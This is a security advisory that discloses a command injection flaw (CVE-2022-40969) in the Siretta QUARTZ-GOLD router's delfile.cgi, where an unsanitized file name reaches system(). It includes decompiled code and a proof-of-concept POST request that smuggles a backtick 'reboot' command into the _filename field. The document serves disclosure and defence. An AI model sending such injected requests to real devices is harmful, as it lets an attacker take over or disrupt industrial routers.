# Talos Vulnerability Report

### TALOS-2022-1607

## Siretta QUARTZ-GOLD httpd delfile.cgi OS command injection vulnerability

##### January 26, 2023

##### CVE Number

CVE-2022-40969

##### SUMMARY

An os command injection vulnerability exists in the httpd delfile.cgi functionality of Siretta QUARTZ-GOLD G5.0.1.5-210720-141020. A specially-crafted HTTP request can lead to arbitrary command execution. An attacker can send an HTTP request to trigger this vulnerability.

##### CONFIRMED VULNERABLE VERSIONS

The versions below were either tested or verified to be vulnerable by Talos or confirmed to be vulnerable by the vendor.

Siretta QUARTZ-GOLD G5.0.1.5-210720-141020

##### PRODUCT URLS

QUARTZ-GOLD - <https://www.siretta.com/products/industrial-routers/4g-lte-router/gigabit-ethernet-small-footprint-lte-router-eu/>

##### CVSSv3 SCORE

7.2 - CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H

##### CWE

CWE-78 - Improper Neutralization of Special Elements used in an OS Command (‘OS Command Injection’)

##### DETAILS

The Siretta QUARTZ-GOLD is an industrial cellular router with several features and services, such as: SSH, UPNP, VPN, SNMP and many others.

The QUARTZ-GOLD router has a web server with several functionalities, a subset of which are related to the management of external files. Indeed, the web-server offers API for uploading files, downloading them, and also deleting if no longer required.

Following the API to delete a previously uploaded file:

```
void delfile.cgi(void)

{
  [...]

  [... calculate the value of the base_folder variable ...]
  _filename_param = (char *)webcgi_safeget("_filename");                                                        [1]
  filename_ = "";
  if (_filename_param != (char *)0x0) {
    filename_ = _filename_param;
  }
  if (*filename_ != '\0') {
    sprintf(command_buff,"rm -rf %s/%s",base_folder,filename_);                                                 [2]
    system(command_buff);                                                                                       [3]
  }
  [...]
}

```

The `delfile.cgi` expects one parameter called `_filename` that represents the filename of the desired file to be deleted. At `[1]` the uploaded parameter is taken and then used at `[2]` for composing the command `rm -rf <base_folder>/<_filename>`. The composed string is then used at `[3]` as argument of the `system` function. The `_filename` is not sanitized and will be used in the `system` function, which can lead to an OS command injection.

### Exploit Proof of Concept

Sending a request like the following:

```
POST /delfile.cgi HTTP/1.1
Authorization: Basic <a valid basic auth value>
Content-Length: 48

_filename=`reboot`f&_http_id=<the correct tid>

```

will cause the device to reboot.

2022-10-20 - Vendor Disclosure

2022-11-24 - Vendor Patch Release

2023-01-26 - Public Release
